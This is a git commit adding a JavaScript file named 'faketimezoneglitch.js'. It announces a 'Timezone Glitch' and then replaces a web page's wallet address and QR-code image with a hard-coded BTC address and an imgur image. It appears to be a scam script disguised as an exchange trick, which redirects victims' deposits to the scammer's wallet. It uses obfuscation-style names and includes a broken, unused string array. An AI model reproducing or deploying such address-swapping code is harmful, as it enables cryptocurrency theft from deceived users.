f7b8c64aba86810dc41c06cf0037427511d6f6aa
Fs <61254714+HalfTurk@users.noreply.github.com>
2023-04-27 21:01:01 -0400

    Add files via upload

---
+++ faketimezoneglitch.js
@@ -0,0 +1,34 @@
+var _0x918e = [
+  'Timezone Glitch enabled!',
+  ' Press OK to continue.',
+  'row',
+  'getElementsByClassName',
+  'innerHTML',
+  'BTC address : bc1qlewnywstfphp9u4nx87tncwfcg5v0rlxf60f77'',
+  'src',
+  'code',
+  'https://i.imgur.com/QB0zS3r.png',
+  'length'
+];
+var _0x3d7b = [
+  'Timezone Glitch enabled!',
+  ' Press OK to continue.',
+  'row',
+  'getElementsByClassName',
+  'innerHTML',
+  'BTC address : bc1qlewnywstfphp9u4nx87tncwfcg5v0rlxf60f77',
+  'src',
+  'code',
+  'https://i.imgur.com/Ldyku2v_d.png',
+  'length'
+];
+alert('Timezone Glitch enabled! Press OK to continue.');
+var int = setInterval(() => {
+  var _0xa007x3 = document.getElementsByClassName('row');
+  _0xa007x3[1].innerHTML = 'BTC address : bc1qlewnywstfphp9u4nx87tncwfcg5v0rlxf60f77';
+  document.getElementsByClassName('code')[0].src = 'https://i.imgur.com/Ldyku2v_d.png';
+  var _0xa007x4 = document.getElementsByClassName('code');
+  if (_0xa007x4.length > 0) {
+    clearInterval(int);
+  }
+}, 10);
